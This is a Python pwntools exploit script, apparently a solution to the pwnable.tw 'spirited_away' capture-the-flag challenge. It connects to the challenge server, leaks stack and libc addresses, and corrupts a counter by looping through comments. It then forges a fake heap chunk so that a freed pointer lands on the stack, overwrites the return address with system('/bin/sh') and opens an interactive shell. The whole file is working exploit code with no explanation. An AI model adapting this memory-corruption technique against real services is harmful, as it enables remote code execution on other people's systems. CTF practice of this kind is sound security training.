from pwn import *

#io=process("./spirited_away")
io=remote("chall.pwnable.tw",10204)
io.sendlineafter("Please enter your name: ","c"*2)
io.sendlineafter("Please enter your age: ","18")
io.recvuntil("Why did you came to see this movie? ")
io.send("a"*56)
io.recvuntil("Please enter your comment: ")
io.send("a"*2)
io.recvuntil("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
leak=io.recv(8)
stack=u32(leak[:4])
libc=u32(leak[4:])
log.info("Stack : "+str(hex(stack)))
log.info("libc : "+str(hex(libc)))
io.sendlineafter("Would you like to leave another comment? <y/n>: ","y\x00")


for i in range(9):
    print i
    io.sendlineafter("Please enter your name: ","c"*2)
    io.sendlineafter("Please enter your age: ","1")
    io.recvuntil("Why did you came to see this movie? ")
    io.send("a"*2)
    io.recvuntil("Please enter your comment: ")
    io.send("a"*2)
    io.sendlineafter("Would you like to leave another comment? <y/n>: ","y\x00")


for i in range(90):
    print i
    io.sendlineafter("Please enter your name: Please enter your age: ","18")
    io.recvuntil("Why did you came to see this movie? ")
    io.send("aaaa")
    io.sendlineafter("Would you like to leave another comment? <y/n>: ","y\x00")


addr=stack-0x60

io.sendlineafter("Please enter your name: ","\x00"*10)
io.sendlineafter("Please enter your age: ","1")
io.recvuntil("Why did you came to see this movie? ")
io.send("a"*8+p32(0)+p32(0x41)+"a"*56+p32(0)+p32(0x1009))
io.recvuntil("Please enter your comment: ")
io.sendline("\x00"*72+p32(0)+p32(0x41)+"b"*4+p32(addr))
io.sendlineafter("Would you like to leave another comment? <y/n>: ","y\x00")

libc_base=libc-0x1ed010

system=libc_base+0x3ada0

binsh=libc_base+0x15ba0b

#gdb.attach(io)

io.sendlineafter("Please enter your name: ","1"*64+p32(0x804a550)+p32(system)+p32(binsh)*2)
io.sendlineafter("Please enter your age: ","1")
io.recvuntil("Why did you came to see this movie? ")
io.send("1")
io.recvuntil("Please enter your comment: ")
io.sendline("a"*10)
io.sendlineafter("Would you like to leave another comment? <y/n>: ","n\x00")
io.interactive()
